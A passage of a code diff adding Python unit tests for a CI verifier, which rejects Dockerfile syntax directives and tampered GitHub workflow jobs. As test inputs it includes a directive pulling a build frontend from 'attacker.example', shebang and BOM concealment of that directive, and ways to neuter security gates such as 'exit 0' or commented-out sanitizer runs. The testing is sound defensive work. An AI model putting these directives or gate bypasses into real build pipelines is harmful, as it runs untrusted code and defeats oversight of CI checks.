+                        sort_keys=True,
+                    )
+                    + "\n"
+                ),
+                image_lock=image_lock_value,
+                package_lock=package_lock,
+                snapshot_source=snapshot_source,
+                installer=installer,
+                suite_gate=suite_gate,
+            )
+            with self.assertRaises(module.ContractError) as raised:
+                module._verify_dockerfile(root)
+            self.assertIn(
+                "Docker syntax parser directive is forbidden",
+                str(raised.exception),
+            )
+
+        utf8_bom = bytes((0xEF, 0xBB, 0xBF))
+        frontend = "attacker.example/frontend:latest"
+        preamble_cases = (
+            (
+                "first-line-shebang",
+                b"#!/bin/sh\n",
+                "first-line Dockerfile shebang is forbidden",
+                False,
+            ),
+            (
+                "reviewer-shebang-syntax",
+                f"#!/bin/sh\n# syntax={frontend}\n".encode(),
+                "Docker syntax parser directive is forbidden",
+                True,
+            ),
+            (
+                "utf8-bom",
+                utf8_bom,
+                "UTF-8 BOM is forbidden",
+                False,
+            ),
+            (
+                "utf8-bom-syntax",
+                utf8_bom + f"# syntax={frontend}\n".encode(),
+                "UTF-8 BOM is forbidden",
+                True,
+            ),
+            (
+                "utf8-bom-shebang-syntax",
+                utf8_bom + f"#!/bin/sh\n# syntax={frontend}\n".encode(),
+                "UTF-8 BOM is forbidden",
+                True,
+            ),
+        )
+        for label, preamble, diagnostic, syntax_expected in preamble_cases:
+            with self.subTest(
+                docker_frontend_preamble=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                detector_source = (preamble + dockerfile.encode()).decode("utf-8")
+                detected = module._buildkit_syntax_directive(detector_source)
+                self.assertEqual(detected is not None, syntax_expected)
+                if detected is not None:
+                    self.assertEqual(detected[0], frontend)
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=dockerfile,
+                    image_lock=image_lock_value,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                (root / "Dockerfile.ci").write_bytes(
+                    preamble + dockerfile.encode()
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_dockerfile(root)
+                self.assertIn(diagnostic, str(raised.exception))
+
+        allowed_escape_directives = (
+            "# escape=" + "\\" + "\n\n",
+            "# EsCaPe = " + "\\" + "\n\n",
+            "#\tescape=\t" + "\\" + "\n\n",
+        )
+        for directive in allowed_escape_directives:
+            with self.subTest(
+                allowed_escape_directive=directive.rstrip()
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=directive + dockerfile,
+                    image_lock=image_lock_value,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                module._verify_dockerfile(root)
+
+        with tempfile.TemporaryDirectory() as temporary_text:
+            root = Path(temporary_text)
+            self._write_image_fixture(
+                root,
+                dockerfile="# escape=`\n\n" + dockerfile,
+                image_lock=image_lock_value,
+                package_lock=package_lock,
+                snapshot_source=snapshot_source,
+                installer=installer,
+                suite_gate=suite_gate,
+            )
+            with self.assertRaises(module.ContractError) as raised:
+                module._verify_dockerfile(root)
+            self.assertIn(
+                "unsupported Docker escape directive", str(raised.exception)
+            )
+
+        non_active_frontend_comments = (
+            " # syntax=attacker.example/frontend:latest\n",
+            "\t# syntax=attacker.example/frontend:latest\n",
+            "# syntax is discussed here, not selected\n",
+        )
+        for comment in non_active_frontend_comments:
+            with self.subTest(
+                non_active_frontend_comment=comment.encode(
+                    "unicode_escape"
+                ).decode("ascii")
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                self.assertIsNone(
+                    module._buildkit_syntax_directive(comment + dockerfile)
+                )
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=comment + dockerfile,
+                    image_lock=image_lock_value,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                module._verify_dockerfile(root)
+
+    def test_darwin_security_profiles_are_independent_and_aggregated(self) -> None:
+        """Reject no-op profiles, sibling edges, and inactive suite checks."""
+        module = self._load_lock_module()
+        module._verify_darwin_security_dag(REPO_ROOT)
+        workflow_path = REPO_ROOT / ".github/workflows/ci-integration-suite.yml"
+        workflow = workflow_path.read_text(encoding="utf-8")
+        cases = (
+            (
+                "sibling-dependency",
+                "sanitizer-asan-darwin",
+                "    needs: integration-plan\n",
+                "    needs: sanitizer-tsan-darwin\n",
+                "sanitizer-asan-darwin complete job mapping differs",
+            ),
+            (
+                "missing-gate-dependency",
+                "suite-gate",
+                "      - fuzz-codecs-darwin\n",
+                "",
+                "suite-gate complete job mapping differs",
+            ),
+            (
+                "tsan-commented-noop",
+                "sanitizer-tsan-darwin",
+                "        run: bash ci/scripts/sanitizer_test.sh\n",
+                (
+                    "        run: |\n"
+                    "          # bash ci/scripts/sanitizer_test.sh\n"
+                    "          :\n"
+                ),
+                "sanitizer-tsan-darwin complete job mapping differs",
+            ),
+            (
+                "tsan-environment-commented",
+                "sanitizer-tsan-darwin",
+                "          SANITIZER: tsan\n",
+                "          # SANITIZER: tsan\n",
+                "sanitizer-tsan-darwin complete job mapping differs",
+            ),
+            (
+                "preverification-extra-step",
+                "sanitizer-asan-darwin",
+                "      - name: Verify exact Darwin ASan runner\n",
+                (
+                    "      - name: Unexpected preverification step\n"
+                    "        run: true\n"
+                    "      - name: Verify exact Darwin ASan runner\n"
+                ),
+                "sanitizer-asan-darwin complete job mapping differs",
+            ),
+            (
+                "profile-continue-on-error",
+                "sanitizer-asan-darwin",
+                "        run: bash ci/scripts/sanitizer_test.sh\n",
+                (
+                    "        run: bash ci/scripts/sanitizer_test.sh\n"
+                    "        continue-on-error: true\n"
+                ),
+                "sanitizer-asan-darwin complete job mapping differs",
+            ),
+            (
+                "runner-verification-extra-if",
+                "sanitizer-asan-darwin",
+                (
+                    "      - name: Verify exact Darwin ASan runner\n"
+                    "        run: >-\n"
+                ),
+                (
+                    "      - name: Verify exact Darwin ASan runner\n"
+                    "        if: always()\n"
+                    "        run: >-\n"
+                ),
+                "sanitizer-asan-darwin complete job mapping differs",
+            ),
+            (
+                "download-extra-with",
+                "fuzz-codecs-darwin",
+                "          path: CI-results/profile-inventory\n",
+                (
+                    "          path: CI-results/profile-inventory\n"
+                    "          merge-multiple: true\n"
+                ),
+                "fuzz-codecs-darwin complete job mapping differs",
+            ),
+            (
+                "upload-extra-shell",
+                "sanitizer-tsan-darwin",
+                "        if: always()\n",
+                "        if: always()\n        shell: bash\n",
+                "sanitizer-tsan-darwin complete job mapping differs",
+            ),
+            (
+                "gate-result-binding-commented",
+                "suite-gate",
+                (
+                    "          CI_DARWIN_ASAN_RESULT: "
+                    "${{ needs.sanitizer-asan-darwin.result }}\n"
+                ),
+                (
+                    "          # CI_DARWIN_ASAN_RESULT: "
+                    "${{ needs.sanitizer-asan-darwin.result }}\n"
+                ),
+                "suite-gate complete job mapping differs",
+            ),
+            (
+                "gate-call-commented-noop",
+                "suite-gate",
+                (
+                    "        run: >-\n"
+                    "          python3 .ci-suite-gate-control/ci/scripts/"
+                    "integration_suite_gate.py\n"
+                    "          --output \"$GITHUB_OUTPUT\"\n"
+                ),
+                (
+                    "        run: |\n"
+                    "          # python3 .ci-suite-gate-control/ci/scripts/"
+                    "integration_suite_gate.py --output \"$GITHUB_OUTPUT\"\n"
+                    "          :\n"
+                ),
+                "suite-gate complete job mapping differs",
+            ),
+            (
+                "gate-early-exit",
+                "suite-gate",
+                (
+                    "        run: >-\n"
+                    "          python3 .ci-suite-gate-control/ci/scripts/"
+                    "integration_suite_gate.py\n"
+                    "          --output \"$GITHUB_OUTPUT\"\n"
+                ),
+                (
+                    "        run: |\n"
+                    "          exit 0\n"
+                    "          python3 .ci-suite-gate-control/ci/scripts/"
+                    "integration_suite_gate.py --output \"$GITHUB_OUTPUT\"\n"
+                ),
+                "suite-gate complete job mapping differs",
+            ),
+            (
+                "gate-extra-step",
+                "suite-gate",
+                "      - name: Aggregate the exact shared integration DAG\n",
+                (
+                    "      - name: Unexpected gate step\n"
+                    "        run: true\n"
+                    "      - name: Aggregate the exact shared integration DAG\n"
+                ),
+                "suite-gate complete job mapping differs",
+            ),
+            (
+                "gate-attestation-env-deleted",
+                "suite-gate",
+                (
+                    "          CI_ATTESTATION_RESULT: "
+                    "${{ needs.attest-targeted-artifacts.result }}\n"
+                ),
+                "",
+                "suite-gate complete job mapping differs",
+            ),
+        )
+        for label, job_name, original, replacement, diagnostic in cases:
+            with self.subTest(
+                darwin_dag_drift=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                root = Path(temporary_text)
+                workflow_root = root / ".github/workflows"
+                workflow_root.mkdir(parents=True)
+                lock_root = root / "ci/locks"
+                lock_root.mkdir(parents=True)
+                shutil.copy2(
+                    REPO_ROOT / "ci/locks/actions.lock",
+                    lock_root / "actions.lock",
+                )
+                mutated = self._replace_workflow_job_fragment(
+                    workflow, job_name, original, replacement
+                )
+                (workflow_root / "ci-integration-suite.yml").write_text(
+                    mutated, encoding="utf-8"
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_darwin_security_dag(root)
                 self.assertIn(diagnostic, str(raised.exception))
 
     def test_unpinned_yaml_workflow_fails_the_same_lock_parser(self) -> None:
